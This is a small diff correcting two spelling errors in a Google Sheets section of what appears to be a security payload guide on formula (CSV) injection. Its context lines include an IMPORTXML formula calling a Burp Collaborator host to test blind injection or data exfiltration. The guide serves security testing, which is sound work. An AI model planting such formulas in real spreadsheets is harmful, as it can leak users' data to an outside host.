@@ -65,7 +65,7 @@ Technical details of the above payloads:
 
 ### Google Sheets
 
-Google Sheets allows some additionnal formulas that are able to fetch remote URLs:
+Google Sheets allows some additional formulas that are able to fetch remote URLs:
 
 * [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
 * [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
@@ -79,7 +79,7 @@ So one can test blind formula injection or a potential for data exfiltration wit
 =IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
 ```
 
-Note: an alert will warn the user a formula is trying to contact an external ressource and ask for authorization.
+Note: an alert will warn the user a formula is trying to contact an external resource and ask for authorization.
 
 ## References
 
